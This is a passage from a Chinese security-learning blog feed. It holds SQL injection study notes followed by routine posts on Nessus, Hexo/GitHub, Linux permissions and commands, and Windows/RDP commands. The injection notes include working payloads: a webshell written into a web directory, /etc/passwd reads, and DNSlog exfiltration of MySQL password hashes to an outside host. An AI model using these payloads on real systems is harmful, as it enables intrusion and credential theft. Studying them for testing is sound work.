class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">=</span><span class="number">97</span>,sleep(<span class="number">5</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure><h2 id="其他注入"><a href="#其他注入" class="headerlink" title="其他注入"></a>其他注入</h2><p>堆叠注入的条件<br>mysqli_multi_query<br>mysql_query</p><h1 id="sql注入读写文件"><a href="#sql注入读写文件" class="headerlink" title="sql注入读写文件"></a>sql注入读写文件</h1><p><strong>读写文件条件:</strong></p><p>1.web目录写权限<br>2.知道web目录的绝对路径<br>3.mysql的用户能执行into dumpfile/into outfile<br>   mysql 用户为高权限用户 最好为DBA<br>4.没有使用函数限制单双引号</p><ul><li><strong>写文件:</strong></li></ul><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="operator">&lt;</span>?<span class="operator">=</span>assert($_REQUEST[<span class="number">1</span>])?<span class="operator">&gt;</span><span class="string">&#x27; into dumpfile &#x27;</span><span class="operator">/</span>var<span class="operator">/</span>www<span class="operator">/</span>html<span class="operator">/</span>uploads<span class="operator">/</span>shell.php<span class="string">&#x27;%23</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">index.php?uname=admin&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> version(),@<span class="variable">@datadir</span>,<span class="string">&#x27;&lt;?php phpinfo()?&gt;&#x27;</span>,<span class="number">4</span> <span class="keyword">into</span> outfile <span class="string">&#x27;/var/www/html/uploads/icq1.php&#x27;</span>#</span><br></pre></td></tr></table></figure><p><strong>into dumpfile</strong><br>写入单行数据,数据不会因系统发生变化<br><strong>into outfile</strong><br>写入多行数据,数据会因系统发生变化</p><p>写文件的内容可以使用char/hex编码绕过<br>绝对路径必须使用单双引号包起来</p><ul><li><strong>读文件</strong></li></ul><p>条件:<br>但是通常情况下有两个前提:<br>1.在拥有file权限的前提下<br>2.secure_file_priv不为NULL</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> variables <span class="keyword">like</span> &quot;secure_sile_priv&quot;;    <span class="operator">/</span><span class="operator">/</span>查询不为空</span><br></pre></td></tr></table></figure><p><strong>1.load_file()</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; union select 1,load_file(&#x27;</span>D:\\<span class="number">1.</span>txt<span class="string">&#x27;),3 --+</span></span><br></pre></td></tr></table></figure><p><strong>2.load data infile()</strong><br><strong>3.system cat</strong></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> <span class="keyword">create</span> <span class="keyword">table</span> <span class="keyword">user</span>(cmd text);</span><br><span class="line"><span class="number">2</span> <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">user</span>(cmd) <span class="keyword">values</span> (load_file(<span class="string">&#x27;/tmp/1.txt&#x27;</span>));</span><br><span class="line"><span class="number">3</span> <span class="keyword">select</span> load_file(<span class="string">&#x27;/etc/passwd&#x27;</span>)</span><br><span class="line"><span class="number">4</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span> load data infile <span class="string">&#x27;/tmp/1.txt&#x27;</span> <span class="keyword">into</span> <span class="keyword">table</span> <span class="keyword">user</span>;</span><br></pre></td></tr></table></figure><h1 id="DNSlog-外带"><a href="#DNSlog-外带" class="headerlink" title="DNSlog 外带"></a>DNSlog 外带</h1><p>使用  \\资源匹配符号 sub服务文件共享. 来访问dns解析服务器,只有Windows 才能外带</p><p>linux中不能外带数据,因为</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">?id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>, (PAYLOAD数据 使用hex进行转换，hex后长度不超过<span class="number">64</span>), <span class="string">&#x27;.mysql.ol84xv.dnslog.cn\\xxx&#x27;</span>)))    #\\防止转义</span><br><span class="line"></span><br><span class="line">#查版本 外带</span><br><span class="line">?id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">select</span> hex(version())), <span class="string">&#x27;.mysql.ol84xv.dnslog.cn\\xxx&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">#查库名</span><br><span class="line">?id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">select</span> hex(schema_name) <span class="keyword">from</span> information_schema.schemata limit <span class="number">0</span>,<span class="number">1</span>), <span class="string">&#x27;.mysql.ol84xv.dnslog.cn\\xxx&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">#查表名</span><br><span class="line">?id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">select</span> hex(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() limit <span class="number">0</span>,<span class="number">1</span>), <span class="string">&#x27;.mysql.ol84xv.dnslog.cn\\xxx&#x27;</span>)))</span><br><span class="line"></span><br><span class="line">#查mysql密码</span><br><span class="line">?id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> load_file(concat(<span class="string">&#x27;\\\\&#x27;</span>, (<span class="keyword">select</span> hex(mid(authentication_string,<span class="number">1</span>,<span class="number">30</span>)) <span class="keyword">from</span> mysql.user), <span class="string">&#x27;.mysql.ol84xv.dnslog.cn\\xxx&#x27;</span>)))</span><br></pre></td></tr></table></figure><p>同样也可以利用 http服务日志来进行外带.</p>]]></content>
      
      
      
        <tags>
            
            <tag> sql注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubantu 安卓Nessus</title>
      <link href="/posts/8500/"/>
      <url>/posts/8500/</url>
      
        <content type="html"><![CDATA[<p>下载地址:<a href="http://www.tenable.com/products/nessus/select-your-operating-system#tos">http://www.tenable.com/products/nessus/select-your-operating-system#tos</a></p><p>选择Ubuntu18.10,需要下载Ubuntu相应版本的Nessus</p><p>安装Nessus<br>将文件拷贝到到/opt文件夹下：</p><p>sudo cp Nessus-8.0.1-ubuntu1110_amd64.deb /opt<br>安装Nessus:</p><p>sudo dpkg -i Nessus-8.0.1-ubuntu1110_amd64.deb<br>启动Nessus服务</p><p>sudo  /bin/systemctl start nessusd.service<br>设置账号密码1</p><p>打开浏览器：<a href="https://127.0.0.1:8834/">https://127.0.0.1:8834/</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github搭建hexo-blog及域名配置</title>
      <link href="/posts/12629/"/>
      <url>/posts/12629/</url>
      
        <content type="html"><![CDATA[<p>免费无需云服务器，安全稳定，极低的维护成本，无需备案，域名使用godaddy，顶级域名.cc.me.pw.几块钱一个，搭建blog方便快捷。</p><h3 id="安装hexo及环境"><a href="#安装hexo及环境" class="headerlink" title="安装hexo及环境"></a>安装hexo及环境</h3><p>安装 nodejs</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">choco install nodejs</span><br></pre></td></tr></table></figure><p>安装git</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">choco install git</span><br></pre></td></tr></table></figure><p>npm安装hexo</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>创建目录blog-name并拉取hexo源码，需要CD到指定目录执行。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo init blog-name</span><br></pre></td></tr></table></figure><p>测试是否安装成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo server</span><br></pre></td></tr></table></figure><h3 id="github部署"><a href="#github部署" class="headerlink" title="github部署"></a>github部署</h3><p>注册github.com账号生成密钥</p><p>本地生成密钥</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -C <span class="string">&quot;你的邮箱&quot;</span></span><br></pre></td></tr></table></figure><p>敲回车键三次</p><p>复制刚刚创建的密钥<code>windows</code> 用户可以在 <code>C://用户//admin//.ssh</code> 目录下查找，mac 用户可以在 <code>~/.ssh</code> 目录下找到。复制 <code>id_rsa.pub</code> 文件里的信息</p><p>粘贴到—githup点击头像—Settings—SSH and GPG keys—设置SSH keys</p><p>此时你还需要配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name <span class="string">&quot;liuxianan&quot;</span>// 你的github用户名，非昵称</span><br><span class="line">git config --global user.email  <span class="string">&quot;xxx@qq.com&quot;</span>// 填写你的github注册邮箱</span><br></pre></td></tr></table></figure><p>github新建项目</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211217231243707.png" alt="image-20211217231243707"></p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211217231438850.png" alt="image-20211217231438850"></p><p>修改站点配置文件 _config.yml 配置文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: git@github.com:bbbstark/bstarks.git</span><br><span class="line">  branch: main</span><br></pre></td></tr></table></figure><p>安装 hexo-deployer-git</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save </span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo clean &amp;&amp; hexo generate</span><br></pre></td></tr></table></figure><p>运行 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo deploy</span><br></pre></td></tr></table></figure><h3 id="github域名绑定"><a href="#github域名绑定" class="headerlink" title="github域名绑定"></a>github域名绑定</h3><p>godaddy注册域名<br>注册域名可支付宝付款。</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211218201701123.png" alt="image-20211218201701123"></p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211218201511019.png" alt="image-20211218201511019"></p><p>添加DNS  A记录 其中2条即可</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">185.199.108.153</span><br><span class="line">185.199.109.153</span><br><span class="line">185.199.110.153</span><br><span class="line">185.199.111.153</span><br></pre></td></tr></table></figure><p>添加CNAME记录</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GitHub用户名.github.io .</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211218201556457.png" alt="image-20211218201556457"></p><p>如图添加完后 等待 DNS 配置生效，一般10分钟内就会生效。</p><p><img src="https://raw.githubusercontent.com/bbbstark/images/main/image-20211218201429680.png" alt="image-20211218201429680"></p>]]></content>
      
      
      
        <tags>
            
            <tag> github </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 用户权限控制</title>
      <link href="/posts/35674/"/>
      <url>/posts/35674/</url>
      
        <content type="html"><![CDATA[<h2 id="用户权限"><a href="#用户权限" class="headerlink" title="用户权限"></a>用户权限</h2><p>\1. 超级用户：拥有对系统的最高管理权限，默认是root用户 </p><p>\2. 普通用户：只能对自己目录下的文件进行访问和修改，具有登录到系统的权限</p><p>\3. 虚拟用户：不能登录系统，主要是方便管理系统，如：bin、adm、nobody用户等</p><ul><li>/etc/passwd 存储当前系统中所有用户的信息（密码除外）</li></ul><table><thead><tr><th>user</th><th>x</th><th>123</th><th>456</th><th>xxx</th><th>/home/user</th><th>/bin/bash</th></tr></thead><tbody><tr><td>用户名</td><td>密码占位符</td><td>用户编号</td><td>用户组编号</td><td>用户注释信息</td><td>用户家目录</td><td>shell类型</td></tr></tbody></table><ul><li>/etc/shadow 存储当前系统中所有用户的密码信息</li></ul><table><thead><tr><th>user</th><th>$v.afdie34</th><th>:::::</th></tr></thead><tbody><tr><td>用户名</td><td>用户密码</td><td>其他内容</td></tr></tbody></table><p>• 第一个字段（root）：用户名</p><p>• 第二个字段（$…0）：加密后的密码（盐值加密）</p><p>• 第三个字段：密码的最后一次修改时间（元年计 数， 1970年1月1日作为1 ） </p><p>• 第四个字段：密码在多少天内不能更改</p><p>• 第五个字段（99999）：密码在多少天后必须更改 </p><p>• 第六个字段（7）：密码到期前多少天给用户发出警告 </p><p>• 第七个字段：密码在多少天后用户账户将被禁用</p><p>• 第八个字段：密码将禁用的具体日期</p><p>• 第九个字段：保留字段</p><ul><li>/etc/group 存储当前系统中所有用户组信息</li></ul><table><thead><tr><th>group</th><th>x</th><th>123</th><th>qwe,abc,zxz</th></tr></thead><tbody><tr><td>组名称</td><td>组密码占位符</td><td>组编号</td><td>组中用户名列表</td></tr></tbody></table><p>• 第一个字段（root）：用户组的组名 </p><p>• 第二个字段（x）：加密后的用户组密码 </p><p>• 第三个字段（0）：用户组ID，GID </p><p>• 第四个字段（空值）：用户组的成员列表，多个组成员用逗号分隔</p><ul><li>/etc/gshadow 存储用户组密码的一类信息</li></ul><table><thead><tr><th>group</th><th>$v.afdie34</th><th>abc</th><th>xyz,qwe</th></tr></thead><tbody><tr><td>用户名</td><td>组密码</td><td>用户组管理员</td><td>用户组的成员列表</td></tr></tbody></table><ul><li><strong>用户命令</strong></li></ul><table><thead><tr><th>命令</th><th>说明</th></tr></thead><tbody><tr><td>useradd 用户名</td><td>创建用户同时创建与用户同名的组</td></tr><tr><td>useradd -g 组名 用户名</td><td>创建用户并指定用户组</td></tr><tr><td>useradd 用户名 -s xxx</td><td>创建用户并指定登录使用的shell,值为/sbin/nologin或bin/false,禁止登录</td></tr><tr><td>usermod -g 用户组 用户名</td><td>修改用户所在的用户组</td></tr><tr><td>usermod -l 新用户名 用户名</td><td>修改用户名</td></tr><tr><td>userdel 用户名</td><td>删除用户,不删除家目录,-r删除家目录.</td></tr><tr><td>passwd</td><td>修改用户密码,如果新用户则创建新密码</td></tr></tbody></table><ul><li><strong>用户组命令</strong></li></ul><table><thead><tr><th>命令</th><th></th></tr></thead><tbody><tr><td>groupadd 组名</td><td>创建用户组</td></tr><tr><td>group -g 组编号 组名</td><td>创建用户组同时指定编号</td></tr><tr><td>groupmod -n 新组名 旧组名</td><td>修改用户组名</td></tr><tr><td>groupmod -g 组编号 组名</td><td>修改用户组组编号</td></tr><tr><td>groupdel 组名</td><td>删除指定用户组</td></tr><tr><td>gpasswd</td><td>修改设置用户组密码</td></tr></tbody></table><h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><ul><li><strong>ls -alh</strong></li></ul><p>· -a 显示所有文件及目录 (<strong>.</strong> 开头的隐藏文件也会列出)</p><p>· -l 除文件名称外，亦将文件型态、权限、拥有者、文件大小等资讯详细列出</p><p>· -h 显示所有文件及目录的大小</p><p><strong>R     W     X</strong></p><p><strong>4     2      1</strong></p><p><strong>读(read)  写(write)  执行x(execute)</strong></p><p>  <strong>rwx     rwx    rwx</strong></p><p>  <strong>421=7    421=7   421=7</strong>   </p><p><strong>文件所有者 文件所属组  其他用户</strong></p><p><strong>常用组合：777最高权限，644普通文件权限，755执行权限</strong></p><ul><li><strong>改变文件或者目录权限</strong></li></ul><p><strong>[root@localhost ~]# chmod [选项] 模式 文件名</strong></p><p>选项：-R 表示递归（Linux系统下子目录权限不继承父目录）</p><p><strong>权限字母表示法：[u、g、o、a] [+-=] [rwx]</strong> </p><p><strong>权限数字表示法：[mode=421]</strong></p><ul><li><strong>改变文件或者目录所有者</strong></li></ul><p>[root@localhost ~]# <strong>chown</strong> 所有者用户名 文件名 #修改文件所有者</p><p>[root@localhost ~]# <strong>chown</strong> 所有者:所属组 文件名 #同时改变所有者和所属组</p><p>Test：</p><p>[root@localhost ~]# <strong>chown</strong> icq test</p><p>[root@localhost ~]# <strong>chown</strong> icq:icqtest test</p><p>• 选项：-R 表示递归，处理指定目录及其子目录下的所有文件</p><ul><li><strong>改变文件或者目录的属组</strong></li></ul><p>• 选项：-R 表示递归，处理指定目录及其子目录下的所有文件</p><p>[root@localhost ~]# <strong>chgrp</strong> 用户组 文件或目录 #改变文件或目录的所属组</p><p>Test：</p><p>[root@localhost ~]# <strong>chgrp</strong> icqtest test.txt</p><ul><li><strong>设置文件的默认权限</strong></li></ul><p>[root@localhost ~]# <strong>umask</strong> [-S] #显示、设置文件的默认权限</p><p>参数说明： -S 以 rwx 形式显示新建文件的默认权限</p><p>• 如果用户建立文件，默认是没有可执行权限的，即权限表示为 –rw-rw-rw-，即666 </p><p>• 如果用户建立目录，默认权限是全开放的，即权限表示drwxrwxrwx，即777</p><ul><li><strong>Linux默认文件权限022</strong></li></ul><p>建立文件时，666-022== 644，即rw-r–r—</p><p>建立目录时，777-022== 755，即drwx-r-xr-x</p><p><strong>666-522=144</strong></p><p><strong>777-522=633</strong></p><p><strong>777</strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>必背Linux基础命令</title>
      <link href="/posts/29722/"/>
      <url>/posts/29722/</url>
      
        <content type="html"><![CDATA[<h3 id="基础命令"><a href="#基础命令" class="headerlink" title="基础命令"></a>基础命令</h3><h5 id="常用关机命令"><a href="#常用关机命令" class="headerlink" title="常用关机命令"></a>常用关机命令</h5><p>poweroff<br>halt </p><h5 id="常用重启命令"><a href="#常用重启命令" class="headerlink" title="常用重启命令"></a>常用重启命令</h5><p>Reboot</p><h5 id="Init命令"><a href="#Init命令" class="headerlink" title="Init命令"></a>Init命令</h5><p>#init 0 - 停机（千万不能把initdefault 设置为0 ）<br>#init 1 - 单用户模式<br>#init 2 - 多用户，没有 NFS 不联网<br>#init 3 - 完全多用户模式(标准的运行级)<br>#init 4 - 没有用到<br>#init 5 - X11 （xwindow) 图形化界面模式<br>#init 6 - 重新启动 （千万不要把initdefault 设置为6 ）</p><h5 id="shutdown命令"><a href="#shutdown命令" class="headerlink" title="shutdown命令"></a>shutdown命令</h5><p>shutdown -c  取消前一个关机命令<br>shutdown -h 关机<br>Shutdown -h now<br>Shutdown -h 10<br>Shutdown -h 11:00<br>shutdown -r 重启<br>shutdown -r now<br>shutdown -r 10<br>shutdown -r 11:00</p><h3 id="系统文件增删改查类"><a href="#系统文件增删改查类" class="headerlink" title="系统文件增删改查类"></a>系统文件增删改查类</h3><h5 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h5><p>ll -a<br>-a 显示隐藏文件<br>-l  显示详细列表<br>-lR  显示所有子目录相信列表<br>-al  显示所有包含隐藏文件.的列表</p><h5 id="mkdir命令"><a href="#mkdir命令" class="headerlink" title="mkdir命令"></a>mkdir命令</h5><p>创建目录<br>Mkdir -p  递归创建所有目录 如：mkdir -p /a/b/c/d/e/f/<br>mkdir -p -m 755 d1/d2/d3/d4  创建并设置权限755的目录</p><h5 id="touch命令"><a href="#touch命令" class="headerlink" title="touch命令"></a>touch命令</h5><p>touch test.txt 创建文件<br>touch 改文件时间<br>touch -a -m -t -d -c 修改时间  年月日时分秒 2020-10-11 11:11:10 date.txt<br>rm -rf /* （-f强制删除，-r递归删除，i信息提示）</p><h5 id="cp命令"><a href="#cp命令" class="headerlink" title="cp命令"></a>cp命令</h5><p>cp -r /etc/ /root/bakcup/  （ -r 递归复制目录 -p 保留文件所有属性）</p><h5 id="mv命令"><a href="#mv命令" class="headerlink" title="mv命令"></a>mv命令</h5><p>mv {选项} 源文件 目标文件<br>-f强制覆盖 -i 信息交互提示 -v 显示移动过程</p><h5 id="查看命令"><a href="#查看命令" class="headerlink" title="查看命令"></a>查看命令</h5><p>cat 文件.TXT 查看文件<br>cat 文件1 文件2 &gt; 文件3  合并文件</p><p>more [选项] 文件名  显示预览文件<br>q 或 Q 退出 more。<br>v 在当前行启动一个编辑器。<br>/ 字符串 搜索指定的字符串。 d 向下移动半页。 b 向上移动一页。<br>回车键 向下移动一行。 空格键 向下移动一页。</p><p>head -n 5 a.txt  显示前5行</p><p>tail -n 5 b.txt 显示后5行<br>tail -f c.txt  实时显示最后10 行内容，用于查实时日志</p><h5 id="查找命令"><a href="#查找命令" class="headerlink" title="查找命令"></a>查找命令</h5><p>grep [选项] 模式 文件名  搜索符合关键字的文件内容并输出相关行<br>模式要么是字符（串），要么是正则表达式</p><h5 id="解压缩类"><a href="#解压缩类" class="headerlink" title="解压缩类"></a>解压缩类</h5><p>bz2格式用 -j  gz格式用Z，创建归档压缩  -z是压缩gz -j是压缩bz2<br>归档并压缩<br>tar -zcvf 文件名.tar.gz /download<br>tar -jcvf 文件名.tar.bz2 /tmp/<br>解包解压缩<br>tar -zxvf 文件名.tar.gz<br>tar -jxvf 文件名.tar.bz2<br>unzip 文件名.zip        解压<br>zip 文件名.zip  /upload    压缩<br>zip unzip 需要单独安装 centos 下 yum install -y zip&amp;unzip</p><h5 id="网络类"><a href="#网络类" class="headerlink" title="网络类"></a>网络类</h5><p>查看网络情况<br>netstat -ano  antlp  老版本<br>ss  -antlp  新版本  n显示端口还是名称</p><p>/etc/service   端口与服务的对于关系文件，所有Linux系统都有。</p><p>路由追踪<br>tracert.exe  ip //Windows<br>traceroute  IP //linux<br>解析ip<br>nslookup  baidu.com</p><h5 id="服务类"><a href="#服务类" class="headerlink" title="服务类"></a>服务类</h5><p>top  查看占用CPU占用信息   回车更新 Q退出<br>ps -aux  杀死进程 kill -9 pid<br>w&amp;who  查看当前登录用户 W信息更详细一些。<br>启动服务项<br>systemctl stop/start/restart/status/enable/disable/ xxx<br>service network restart  重启网络服务： </p><h5 id="特殊操作"><a href="#特殊操作" class="headerlink" title="特殊操作"></a>特殊操作</h5><p>vim /etc/selinux/config  selinux 改成 disable关闭安全内核<br>setenforce 0    临时关闭</p><p>alias   设置自定义 命令   ls -l = ll</p><p>看指定目录占用大小<br>du -sh /<br>du -sh ./*<br>整个系统磁盘占用大小<br>df -h<br>后台运行并输出。<br>nohup &amp; </p><p>proxychains</p><h5 id="窗口切换管理工具"><a href="#窗口切换管理工具" class="headerlink" title="窗口切换管理工具"></a>窗口切换管理工具</h5><p>screen -ls  查看窗口列表<br>screen -S name1  新建<br>screen -rd name1  切入<br>ctrl+A+D    切出</p><h5 id="命令行快捷键"><a href="#命令行快捷键" class="headerlink" title="命令行快捷键"></a>命令行快捷键</h5><p> Tab键：自动补齐<br> Ctrl+U：清空至行首<br> Ctrl+K：清空至行尾<br> Ctrl+L：清屏<br> Ctrl+C：中断命令执行<br> Ctrl+Z：后台挂起<br> Ctrl+D：退出Shell</p><h5 id="Linux-挂载U盘"><a href="#Linux-挂载U盘" class="headerlink" title="Linux 挂载U盘"></a>Linux 挂载U盘</h5><p>mount /dev<br>挂载到了mnt目录下。需要创建文件夹，执行 </p><h5 id="Python快速搭建http服务"><a href="#Python快速搭建http服务" class="headerlink" title="Python快速搭建http服务"></a>Python快速搭建http服务</h5><p> 自动共享运行目录<br> Python2 下<br> Python -m SimpleHTTPServer 8080<br> Python3下<br> Python3 -m http.server 8080</p><h5 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h5><p> /etc/service<br> 22改端口配置文件<br>/etc/ssh/sshd_config<br>firewall-cmd –state   //    检查防火墙是否开启<br>firewall-cmd –zone=public –list-ports   //列出当前防火墙的通过端口规则<br>firewall-cmd –zone=public –list-service  //列出当前防火墙的通过端口服务名称规则<br>firewall-cmd –zone=public –add-port=80/tcp –permanent   添加端口<br>firewall-cmd –zone=public –add-service=http –permanent  添加系统自定的/etc/service  服务名称<br>firewall-cmd –zone=public –remove-port=http –permanent  删除端口或服务<br>firewall-cmd –reload  //更改完后需要 重新加载配置文件，使其生效。</p><h2 id="常用配置文件"><a href="#常用配置文件" class="headerlink" title="常用配置文件"></a>常用配置文件</h2><p>网卡配置文件:</p><p>/etc/network/interface.d/ens33    ubuntu 16以下版本</p><p>/etc/netplan/01-network-manager-all.yaml   ubuntu 18以上</p><p>/etc/sysconfig/network-scripts/ifcfg-eth0   centos/redhat</p><p>vim ~/.bashrc         //  shell的个性配置文件</p><p>source ~/.bashrc   //从新加载配置文件生效</p><p>设置别名永远生效:在~/.bashrc  修改当前用户家目录里的.bashrc, 仅对当前用户生效,是个人配置文件./etc/bashrc 对所有用户生效,是全局配置文件.)</p><p>关闭linux防火墙:/etc/selinux/config–将selinux 由enforcing 改为disabled.</p>]]></content>
      
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>windows 基础命令</title>
      <link href="/posts/47555/"/>
      <url>/posts/47555/</url>
      
        <content type="html"><![CDATA[<h1 id="待完善"><a href="#待完善" class="headerlink" title="待完善"></a>待完善</h1><p>mstsc  远程桌面连接 </p><p>ipconfig  /all</p><p>ipconfig /release</p><p>ipconfig /renew</p><p>rename  </p><p>tasklist  查看进程</p><p>kill /pid id 杀进程</p><p>chcp -65001    # Unicode (UTF-8)</p><p>查看防火墙</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netsh advfirewall show rule dir=<span class="keyword">in</span> name=all</span><br></pre></td></tr></table></figure><p>添加防火墙规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;&gt; netsh advfirewall firewall add rule name=icqtest dir=<span class="keyword">in</span> action=allow protocol=tcp localport=3389</span><br></pre></td></tr></table></figure><p>删除防火墙规则</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;&gt; netsh advfirewall firewall delete rule name=icqtest protocol=tcp localport=3389</span><br></pre></td></tr></table></figure><p>关闭防火墙</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator&gt;&gt; netsh firewall <span class="built_in">set</span> opmode mode=<span class="built_in">disable</span></span><br></pre></td></tr></table></figure><p><strong>常见端口</strong>:</p><p>weblogc : 7001</p><p>mongodb :27017</p><p>redis   :5379</p><p><strong>开启3389:</strong></p><p>windows2008</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#设置远程桌面端口</span><br><span class="line">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; /t REG_DWORD /v portnumber /d 3389 /f</span><br><span class="line">#开启远程桌面</span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 1</span><br><span class="line">#检查端口状态</span><br><span class="line">netstat -an|find &quot;3389&quot;</span><br><span class="line">#关闭远程桌面</span><br><span class="line">wmic RDTOGGLE WHERE ServerName=&#x27;%COMPUTERNAME%&#x27; call SetAllowTSConnections 0</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> window </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSI7层网络模型</title>
      <link href="/posts/23975/"/>
      <url>/posts/23975/</url>
      
